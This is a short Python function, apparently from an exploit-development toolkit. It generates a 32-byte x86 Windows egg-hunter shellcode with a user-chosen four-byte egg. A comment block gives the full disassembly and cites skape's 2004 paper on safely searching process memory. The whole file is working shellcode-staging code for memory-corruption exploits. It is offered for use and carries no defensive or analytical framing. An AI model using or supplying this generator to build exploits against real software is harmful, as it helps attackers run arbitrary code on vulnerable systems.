


def egg_hunter_gen(string):
    egg = str(string)
    egg = egg.encode('utf-8').hex()
    egg = list(egg)
    # opcode = egg[0] + egg[1] + egg[2] + egg[3] + egg[4] + egg[5] + egg[6] + egg[7]
    opcode1 = "\\x"+egg[0] + egg[1] + "\\x"+egg[2] + egg[3]
    opcode2 = "\\x"+egg[4] + egg[5] + "\\x"+egg[6] + egg[7]

    egg = ("egghunter = \\x66\\x81\\xca\\xff\n")
    egg += ("egghunter += \\x0f\\x42\\x52\\x6a\n")
    egg += ("egghunter += \\x02\\x58\\xcd\\x2e\n")
    egg += ("egghunter += \\x3c\\x05\\x5a\\x74\n")
    egg += ("egghunter += \\xef\\xb8{0}\n".format(opcode1))
    egg += ("egghunter += {0}\\x8b\\xfa\n".format(opcode2))
    egg += ("egghunter += \\xaf\\x75\\xea\\xaf\n")
    egg += ("egghunter += \\x75\\xe7\\xff\\xe7")

    return egg

# Reference: "Safely Searching Process Virtual Address Space" skape 2004 http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
# 0:  66 81 ca ff 0f          or     dx,0xfff
# 5:  42                      inc    edx
# 6:  52                      push   edx
# 7:  6a 02                   push   0x2
# 9:  58                      pop    eax
# a:  cd 2e                   int    0x2e
# c:  3c 05                   cmp    al,0x5
# e:  5a                      pop    edx
# f:  74 ef                   je     0x0
# 11: b8 54 30 30 57          mov    eax,0x57303054           egg = "T00W"
# 16: 8b fa                   mov    edi,edx
# 18: af                      scas   eax,DWORD PTR es:[edi]
# 19: 75 ea                   jne    0x5
# 1b: af                      scas   eax,DWORD PTR es:[edi]
# 1c: 75 e7                   jne    0x5
# 1e: ff e7                   jmp    edi